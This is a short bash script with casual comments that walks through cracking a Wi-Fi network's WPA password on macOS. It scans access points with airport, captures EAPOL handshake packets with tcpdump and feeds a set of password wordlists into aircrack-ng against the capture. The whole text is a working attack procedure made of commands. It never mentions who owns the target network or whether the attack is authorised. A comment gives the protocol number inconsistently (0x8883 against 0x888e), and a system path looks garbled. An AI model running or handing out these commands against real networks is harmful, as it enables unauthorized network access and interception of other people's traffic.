#!/bin/bash

airport -s # where `airport` is an alias for the longass /System/Lib/208.28/bin/airport script in the defaulty bowels
# and -s means 'scan'
# Yields ESSID, BSSID, channel, security, &c

# -I is monitoring mode
# -U is packet-buffered
# -i is to specify interface (see `$ ifconfig`)
# -vvv is very, very verbose
# -w is writefile
# Note that you can check multiple hosts with `($BSSID1 or $BSSID2)` -- see tcpdump.org/tcpdump_man.html
# The ether protocol is all about dat handshake.
sudo tcpdump "ether host $YOURBSSID and ether proto 0x888e" -I -U -i en1 -vvv -w outfile.cap
# watch for packets captured. this will only capture auth packets (given `and ether proto 0x8883`), so you've got a bite at anything > 0.

cat ~/a/bunch/of/passwords/*.txt | aircrack-ng -w - -e NameOfNetwork -b $YOURBSSID outfile.cap
# cat with pipe because aircrack-ng doesn't accept wildcards in dictionary file args, only individual,files,dumbly
# also I don't understand why you've got to specify *both* BSSID and ESSID, but you do when you've used the protocol filter as above.
# you can not (not cannot) use the ESSID option if you don't specify protocol filtering in the tcpdump.
